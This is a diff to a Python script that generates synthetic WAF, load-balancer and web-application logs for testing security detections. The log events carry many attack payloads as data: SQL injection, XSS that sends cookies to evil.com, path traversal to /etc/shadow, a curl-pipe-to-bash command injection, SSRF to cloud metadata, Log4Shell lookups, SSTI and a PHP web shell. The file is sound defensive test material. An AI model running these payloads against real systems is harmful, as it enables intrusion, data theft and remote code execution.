@@ -3014,6 +3014,377 @@ def generate_sysmon_network_events():
     return events
 
 
+# ═══════════════════════════════════════════════════════════════════
+#  WAF Security Event Generators (OWASP Attacks)
+# ═══════════════════════════════════════════════════════════════════
+
+ATTACKER_IPS = ["185.220.101.1", "91.92.109.18", "45.33.32.156", "194.5.249.7",
+                "23.129.64.100", "51.15.43.205", "178.128.23.9"]
+ATTACKER_UAS = ["sqlmap/1.7", "Nikto/2.1.6", "Mozilla/5.0 (compatible; Hydra/9.0)",
+                "python-requests/2.28.0", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
+                "Gobuster/3.6", "OWASP ZAP/2.14.0"]
+WAF_HOST = "sevenkingdoms.example.com"
+
+
+def waf_event(action, http_method, url, rule_type="PROTECTION_RULES", rule_key="",
+              client_ip=None, user_agent=None, response_code="403",
+              body_data="", content_type="text/html", offset=0):
+    """Generate a WAF security event."""
+    if client_ip is None:
+        client_ip = random.choice(ATTACKER_IPS)
+    if user_agent is None:
+        user_agent = random.choice(ATTACKER_UAS)
+    return {
+        "timeCreated": ts(offset),
+        "action": action,
+        "httpMethod": http_method,
+        "requestUrl": url,
+        "queryString": url.split("?", 1)[1] if "?" in url else "",
+        "clientAddress": client_ip,
+        "countryCode": random.choice(["RU", "CN", "KP", "IR", "US", "DE", "BR"]),
+        "userAgent": user_agent,
+        "responseCode": response_code,
+        "type": rule_type,
+        "protectionRuleKey": rule_key,
+        "protectionRuleAction": action,
+        "bodyData": body_data,
+        "contentType": content_type,
+        "referer": "",
+        "requestHeaders": f"Host: {WAF_HOST}",
+        "wafPolicy": "seven-kingdoms-portal-waf",
+        "fingerprint": uuid.uuid4().hex[:12],
+        "hostname": WAF_HOST,
+        "msg": f"WAF {action}: {http_method} {url[:80]}",
+    }
+
+
+def lb_access_event(http_method, url, status_code, client_ip=None, user_agent=None,
+                    bytes_sent="256", offset=0):
+    """Generate a Load Balancer access log event."""
+    if client_ip is None:
+        client_ip = random.choice(ATTACKER_IPS)
+    if user_agent is None:
+        user_agent = random.choice(ATTACKER_UAS)
+    return {
+        "timeCreated": ts(offset),
+        "httpMethod": http_method,
+        "requestUrl": url,
+        "uriPath": url.split("?")[0],
+        "queryString": url.split("?", 1)[1] if "?" in url else "",
+        "clientAddress": client_ip,
+        "userAgent": user_agent,
+        "statusCode": str(status_code),
+        "backendStatusCode": str(status_code),
+        "backendAddress": "10.0.1.50:9010",
+        "bytesReceived": str(random.randint(100, 5000)),
+        "bytesSent": bytes_sent,
+        "requestProcessingTime": str(random.randint(1, 500)),
+        "hostname": WAF_HOST,
+        "lbName": "seven-kingdoms-portal-lb",
+        "listenerName": "http-listener",
+        "contentType": "application/json",
+        "referer": f"https://{WAF_HOST}/",
+        "msg": f"{http_method} {url} {status_code}",
+    }
+
+
+def webapp_event(attack_type, owasp_category, url, http_method="GET",
+                 status_code="200", payload="", client_ip=None,
+                 user_agent=None, offset=0):
+    """Generate a web application security event."""
+    if client_ip is None:
+        client_ip = random.choice(ATTACKER_IPS)
+    if user_agent is None:
+        user_agent = random.choice(ATTACKER_UAS)
+    return {
+        "timestamp": ts(offset),
+        "httpMethod": http_method,
+        "requestUrl": url,
+        "uriPath": url.split("?")[0],
+        "queryString": url.split("?", 1)[1] if "?" in url else "",
+        "clientAddress": client_ip,
+        "userAgent": user_agent,
+        "statusCode": str(status_code),
+        "attackType": attack_type,
+        "attackPayload": payload,
+        "owaspCategory": owasp_category,
+        "vulnerabilityId": f"CVE-2024-DEMO-{random.randint(100, 999)}",
+        "sessionId": f"sess_{uuid.uuid4().hex[:12]}",
+        "appName": "seven-kingdoms-portal",
+        "requestId": f"req_{uuid.uuid4().hex[:8]}",
+        "hostname": WAF_HOST,
+        "requestBody": payload,
+        "contentType": "application/json",
+        "user": random.choice(["anonymous", "joffrey", "cersei", "tyrion"]),
+        "msg": f"{attack_type}: {http_method} {url[:80]}",
+    }
+
+
+def generate_waf_events():
+    """Generate WAF security events for all OWASP attack types."""
+    events = []
+
+    # SQL Injection attacks (blocked)
+    sqli_payloads = [
+        "/vulnerable/search?q=1' OR '1'='1",
+        "/vulnerable/search?q=' UNION SELECT username,password FROM users--",
+        "/vulnerable/login?user=admin'--&pass=x",
+        "/vulnerable/api/users?id=1; DROP TABLE sessions",
+        "/vulnerable/search?q=' AND SLEEP(5)--",
+        "/vulnerable/search?q=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+        "/vulnerable/search?q=' UNION SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES--",
+    ]
+    for i, payload in enumerate(sqli_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="941100", offset=i))
+    # SQLi allowed through (detection mode)
+    events.append(waf_event("DETECT", "GET", "/vulnerable/search?q=1' OR '1'='1",
+                            rule_key="941100", response_code="200", offset=8))
+
+    # XSS attacks (blocked)
+    xss_payloads = [
+        "/vulnerable/comment?text=<script>alert('XSS')</script>",
+        "/vulnerable/search?q=<img src=x onerror=alert(document.cookie)>",
+        "/vulnerable/profile?name=<svg onload=alert(1)>",
+        "/vulnerable/feedback?msg=<iframe src=javascript:alert('XSS')>",
+        "/vulnerable/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    ]
+    for i, payload in enumerate(xss_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="941160", offset=10 + i))
+
+    # Path Traversal attacks
+    traversal_payloads = [
+        "/vulnerable/file?path=../../../etc/passwd",
+        "/vulnerable/download?file=..%2f..%2f..%2fetc%2fshadow",
+        "/vulnerable/read?doc=....//....//etc/passwd",
+        "/vulnerable/static/../../../proc/self/environ",
+    ]
+    for i, payload in enumerate(traversal_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="930100", offset=16 + i))
+
+    # Command Injection attacks
+    cmdi_payloads = [
+        "/vulnerable/ping?host=; cat /etc/passwd",
+        "/vulnerable/dns?lookup=| id",
+        "/vulnerable/exec?cmd=$(whoami)",
+        "/vulnerable/api/run?input=`/bin/bash -c 'curl http://evil.com/shell.sh | bash'`",
+    ]
+    for i, payload in enumerate(cmdi_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="932100", offset=21 + i))
+
+    # SSRF attacks
+    ssrf_payloads = [
+        "/vulnerable/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "/vulnerable/proxy?target=http://metadata.oraclecloud.com/opc/v2/",
+        "/vulnerable/image?src=http://127.0.0.1:8080/admin",
+        "/vulnerable/webhook?callback=http://10.0.1.50:9090/internal-api",
+    ]
+    for i, payload in enumerate(ssrf_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="934100", offset=26 + i))
+
+    # XXE attacks
+    events.append(waf_event("BLOCK", "POST", "/vulnerable/api/xml",
+                            rule_key="933100",
+                            body_data='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+                            content_type="application/xml", offset=31))
+
+    # SSTI attacks
+    ssti_payloads = [
+        "/vulnerable/template?name={{7*7}}",
+        "/vulnerable/render?tpl={{config.__class__.__init__.__globals__}}",
+        "/vulnerable/preview?data={{''.__class__.__mro__[1].__subclasses__()}}",
+    ]
+    for i, payload in enumerate(ssti_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="934200", offset=33 + i))
+
+    # Log4Shell attacks
+    log4j_payloads = [
+        "/vulnerable/api/log?msg=${jndi:ldap://evil.com/exploit}",
+        "/vulnerable/search?q=${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://evil.com/a}",
+    ]
+    for i, payload in enumerate(log4j_payloads):
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="944100", offset=37 + i))
+
+    # NoSQL injection
+    events.append(waf_event("BLOCK", "GET",
+                            "/vulnerable/api/user?username[$ne]=null&password[$gt]=",
+                            rule_key="942100", offset=40))
+
+    # LDAP injection
+    events.append(waf_event("BLOCK", "GET",
+                            "/vulnerable/ldap?filter=*)(cn=admin)(&",
+                            rule_key="942200", offset=41))
+
+    # Web shell upload
+    events.append(waf_event("BLOCK", "POST", "/vulnerable/upload/shell.php",
+                            rule_key="933100",
+                            body_data='<?php system($_GET["cmd"]); ?>',
+                            content_type="multipart/form-data", offset=42))
+
+    # Rate limiting events
+    rate_limit_ip = "91.92.109.18"
+    for i in range(15):
+        events.append(waf_event("BLOCK", "GET", "/vulnerable/login",
+                                rule_type="REQUEST_RATE_LIMITING",
+                                client_ip=rate_limit_ip,
+                                user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
+                                response_code="429", offset=50 + i))
+
+    # Protocol attacks
+    events.append(waf_event("BLOCK", "GET", "/vulnerable/api",
+                            rule_key="920100",
+                            body_data="", offset=66))
+
+    # CORS bypass
+    events.append(waf_event("BLOCK", "GET", "/vulnerable/api/data",
+                            rule_key="920100", offset=67))
+
+    return events
+
+
+def generate_lb_access_events():
+    """Generate Load Balancer access log events for web attack detection."""
+    events = []
+    scanner_ip = "45.33.32.156"
+
+    # Vulnerability scanner traffic
+    scanner_paths = [
+        "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/.git/config",
+        "/backup", "/db", "/debug", "/console", "/swagger",
+        "/api-docs", "/actuator/health", "/graphql", "/server-status",
+        "/robots.txt", "/sitemap.xml", "/composer.json", "/Dockerfile",
+    ]
+    for i, path in enumerate(scanner_paths):
+        events.append(lb_access_event("GET", path, 404,
+                                      client_ip=scanner_ip,
+                                      user_agent="Nikto/2.1.6", offset=i))
+
+    # Brute force login attempts
+    brute_ip = "185.220.101.1"
+    for i in range(25):
+        events.append(lb_access_event("POST", "/vulnerable/login", 401,
+                                      client_ip=brute_ip,
+                                      user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
+                                      offset=20 + i))
+    # Successful login after brute force
+    events.append(lb_access_event("POST", "/vulnerable/login", 200,
+                                  client_ip=brute_ip,
+                                  user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
+                                  offset=46))
+
+    # Sensitive data access
+    events.append(lb_access_event("GET", "/vulnerable/backup.sql", 200,
+                                  bytes_sent="524288", offset=50))
+    events.append(lb_access_event("GET", "/vulnerable/.env", 200,
+                                  bytes_sent="1024", offset=51))
+    events.append(lb_access_event("GET", "/vulnerable/debug/config.ini", 200,
+                                  bytes_sent="2048", offset=52))
+
+    # HTTP method abuse
+    events.append(lb_access_event("DELETE", "/vulnerable/api/users/1", 200, offset=55))
+    events.append(lb_access_event("PUT", "/vulnerable/api/settings", 200, offset=56))
+    events.append(lb_access_event("TRACE", "/vulnerable/api/echo", 200, offset=57))
+
+    # Large response exfiltration
+    events.append(lb_access_event("GET", "/vulnerable/api/users/export", 200,
+                                  bytes_sent="10485760", offset=60))
+    events.append(lb_access_event("GET", "/vulnerable/api/data/dump", 200,
+                                  bytes_sent="52428800", offset=61))
+
+    # Server errors (injection-caused)
+    for i in range(8):
+        events.append(lb_access_event("POST",
+                                      f"/vulnerable/api/query?sql=SELECT * FROM users WHERE id={i}'",
+                                      500, offset=65 + i))
+
+    # API unauthorized
+    for i in range(10):
+        events.append(lb_access_event("GET", f"/api/v1/admin/users?page={i}", 403,
+                                      offset=75 + i))
+
+    # Suspicious user agents
+    events.append(lb_access_event("GET", "/vulnerable/", 200,
+                                  user_agent="", offset=86))
+    events.append(lb_access_event("GET", "/vulnerable/",  200,
+                                  user_agent="masscan/1.3.2", offset=87))
+    events.append(lb_access_event("GET", "/vulnerable/", 200,
+                                  user_agent="zgrab/0.x", offset=88))
+
+    # Normal traffic (for baseline)
+    normal_uas = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    ]
+    for i in range(20):
+        events.append(lb_access_event("GET", f"/portal/page{i}",  200,
+                                      client_ip=random.choice(CORPORATE_IPS),
+                                      user_agent=random.choice(normal_uas),
+                                      offset=100 + i))
+
+    return events
+
+
+def generate_webapp_events():
+    """Generate web application security events for OWASP attack detection."""
+    events = []
+    attacker_ip = "194.5.249.7"
+
+    # IDOR attacks
+    for i in range(5):
+        events.append(webapp_event(
+            "IDOR", "A01:2021-Broken Access Control",
+            f"/vulnerable/api/users/{i + 100}", "GET", "200",
+            payload=f"id={i + 100}",
+            client_ip=attacker_ip, offset=i))
+
+    # Privilege escalation
+    events.append(webapp_event(
+        "privilege_escalation", "A01:2021-Broken Access Control",
+        "/vulnerable/api/users/me", "PUT", "200",
+        payload='{"role":"admin","isAdmin":true}',
+        client_ip=attacker_ip, offset=6))
+    events.append(webapp_event(
+        "role_manipulation", "A01:2021-Broken Access Control",
+        "/vulnerable/api/settings", "POST", "200",
+        payload='{"permissions":"*","role":"admin"}',
+        client_ip=attacker_ip, offset=7))
+
+    # Authentication bypass
+    events.append(webapp_event(
+        "authentication_bypass", "A07:2021-Identification and Authentication Failures",
+        "/vulnerable/admin/dashboard", "GET", "200",
+        payload="jwt_token_manipulated",
+        client_ip=attacker_ip, offset=9))
+    events.append(webapp_event(
+        "jwt_manipulation", "A07:2021-Identification and Authentication Failures",
+        "/vulnerable/api/token/refresh", "POST", "200",
+        payload='{"alg":"none","typ":"JWT"}',
+        client_ip=attacker_ip, offset=10))
+
+    # Insecure deserialization
+    events.append(webapp_event(
+        "deserialization", "A08:2021-Software and Data Integrity Failures",
+        "/vulnerable/api/import", "POST", "500",
+        payload="rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==",
+        client_ip=attacker_ip, offset=12))
+
+    # Session hijacking
+    events.append(webapp_event(
+        "session_hijacking", "A07:2021-Identification and Authentication Failures",
+        "/vulnerable/dashboard", "GET", "200",
+        payload="stolen_session_token",
+        client_ip="23.129.64.100", offset=14))
+
+    # Mass assignment
+    events.append(webapp_event(
+        "mass_assignment", "A04:2021-Insecure Design",
+        "/vulnerable/api/users/register", "POST", "200",
+        payload='{"username":"attacker","password":"pass123","isAdmin":true,"role":"admin","balance":999999}',
+        client_ip=attacker_ip, offset=16))
+
+    return events
+
+
 def main():
     parser = argparse.ArgumentParser(description="Generate test detection logs")
     parser.add_argument("--validate", action="store_true",
@@ -3041,6 +3412,11 @@ def main():
     # Generate events — Sysmon network connection (dedicated parser)
     sysmon_net_events = generate_sysmon_network_events()
 
+    # Generate events — Web application security (OWASP attacks)
+    waf_events = generate_waf_events()
+    lb_events = generate_lb_access_events()
+    webapp_events = generate_webapp_events()
+
     # Write NDJSON files
     results = {}
     files = [
@@ -3053,6 +3429,9 @@ def main():
         ("linux_secure.jsonl", linsec_events),
         ("sysmon_operational.jsonl", sysmon_events),
         ("sysmon_network.jsonl", sysmon_net_events),
+        ("waf_security.jsonl", waf_events),
+        ("lb_access.jsonl", lb_events),
+        ("webapp_security.jsonl", webapp_events),
     ]
 
     for filename, events in files:
